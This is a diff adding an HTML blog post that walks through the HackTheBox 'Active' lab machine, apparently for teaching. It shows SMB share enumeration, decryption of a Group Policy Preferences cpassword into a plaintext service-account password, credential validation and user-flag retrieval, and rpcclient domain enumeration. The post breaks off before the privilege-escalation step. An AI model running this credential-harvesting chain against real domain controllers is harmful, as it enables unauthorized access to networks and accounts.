@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Active (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Active (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-15T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Active (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-15T00:00:00-06:00","datePublished":"2024-04-15T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Active (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Active (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-15T00:00:00-06:00" itemprop="datePublished">
+        Apr 15, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png" />
+</p>
+
+<ul>
+  <li>Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,445,593,3269,47001,49153,49168 10.10.10.100 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-28 17:22 CST
+Nmap scan report <span class="k">for </span>10.10.10.100
+Host is up <span class="o">(</span>0.66s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-28 23:22:21Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3269/tcp  open  tcpwrapped
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49153/tcp open  msrpc         Microsoft Windows RPC
+49168/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-01-28T23:23:22
+|_  start_date: 2023-01-28T23:13:30
+|_clock-skew: <span class="nt">-1s</span>
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>We see a domain add to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 active.htb
+PING active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>902 ms
+
+<span class="nt">---</span> active.htb ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 901.525/901.525/901.525/0.000 ms
+❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.10.10.100 active.htb
+</code></pre></div></div>
+
+<ul>
+  <li>There are shared resources.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>We can read <code class="language-plaintext highlighter-rouge">Replication</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	NO ACCESS	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	NO ACCESS	Logon server share 
+	Users                                             	NO ACCESS	
+
+</code></pre></div></div>
+
+<ul>
+  <li>We found this.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplication<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
+	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Replication                                       	READ ONLY	
+	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
+	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
+</code></pre></div></div>
+
+<ul>
+  <li>Now download <code class="language-plaintext highlighter-rouge">Groups.xml</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">--download</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
+<span class="o">[</span>+] Starting download: Replication<span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml <span class="o">(</span>533 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/nmap/10.10.10.100-Replication_active.htb_Policies_<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>_MACHINE_Preferences_Groups_Groups.xml
+</code></pre></div></div>
+
+<ul>
+  <li>It’s a password.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/bin/cat groups.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
+&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</code></p>
+
+<ul>
+  <li>We can use <code class="language-plaintext highlighter-rouge">ggp-decrypt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gpp-decrypt <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
+GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>
+
+<ul>
+  <li>And a user.</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">userName="active.htb\SVC_TGS"</code></p>
+
+<ul>
+  <li>Credentials are correct.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<ul>
+  <li>Now that we have credentials we can view other resources.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--shares</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.10.100    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.10.100    445    DC               C<span class="nv">$ </span>                             Default share
+SMB         10.10.10.100    445    DC               IPC<span class="nv">$ </span>                           Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    445    DC               Replication     READ            
+SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    445    DC               Users           READ   
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Users                                             	READ ONLY	
+	.<span class="se">\U</span>sers<span class="se">\*</span>
+	dw--w--w--                0 Sat Jul 21 09:39:20 2018	<span class="nb">.</span>
+	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
+	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
+	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
+	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
+	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
+	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
+	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
+	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
+</code></pre></div></div>
+
+<ul>
+  <li>We can see the <code class="language-plaintext highlighter-rouge">SVC_TGS</code> directory.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Users                                             	READ ONLY	
+	.<span class="se">\U</span>sersSVC_TGS<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 10:16:32 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 10:16:32 2018	..
+	dr--r--r--                0 Sat Jul 21 10:14:20 2018	Contacts
+	dr--r--r--                0 Sat Jul 21 10:14:42 2018	Desktop
+	dr--r--r--                0 Sat Jul 21 10:14:28 2018	Downloads
+	dr--r--r--                0 Sat Jul 21 10:14:50 2018	Favorites
+	dr--r--r--                0 Sat Jul 21 10:15:00 2018	Links
+	dr--r--r--                0 Sat Jul 21 10:15:23 2018	My Documents
+	dr--r--r--                0 Sat Jul 21 10:15:40 2018	My Music
+	dr--r--r--                0 Sat Jul 21 10:15:50 2018	My Pictures
+	dr--r--r--                0 Sat Jul 21 10:16:05 2018	My Videos
+	dr--r--r--                0 Sat Jul 21 10:16:20 2018	Saved Games
+	dr--r--r--                0 Sat Jul 21 10:16:32 2018	Searches
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop
+<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Users                                             	READ ONLY	
+	.<span class="se">\U</span>sersSVC_TGS<span class="se">\D</span>esktop<span class="se">\*</span>
+	dr--r--r--                0 Sat Jul 21 10:14:42 2018	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
+	fw--w--w--               34 Sat Jan 28 17:14:19 2023	user.txt
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Download the <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--download</span> Users/SVC_TGS/Desktop/user.txt
+<span class="o">[</span>+] Starting download: Users<span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>34 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mv </span>10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
+❯ /usr/bin/cat user.txt
+b7d2dfba479b6ffa88442b747b15b65d
+</code></pre></div></div>
+
+<h2 id="root">Root</h2>
+
+<ul>
+  <li>We need more information about the DC.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[SVC_TGS] rid:[0x44f]
+rpcclient <span class="nv">$&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Groups.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[DnsUpdateProxy] rid:[0x44e]
+rpcclient <span class="nv">$&gt;</span> 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querygroupmem 0x200
+	rid:[0x1f4] attr:[0x7]
+rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4
+	User Name   :	Administrator
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	Built-in account <span class="k">for </span>administering the computer/domain
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	sáb, 28 ene 2023 17:14:29 CST
+	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
+	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
+	Password last <span class="nb">set </span>Time   :	mié, 18 jul 2018 14:06:40 CDT
+	Password can change Time :	jue, 19 jul 2018 14:06:40 CDT
+	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
+	unknown_2[0..31]...
+	user_rid :	0x1f4
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x0000003f
+	padding1[0..7]...
+	logon_hrs[0..21]...
+rpcclient <span class="nv">$&gt;</span> 
+
+</code></pre></div></div>
+
+<ul>
+  <li>More information about the users.</li>
+</ul>
+
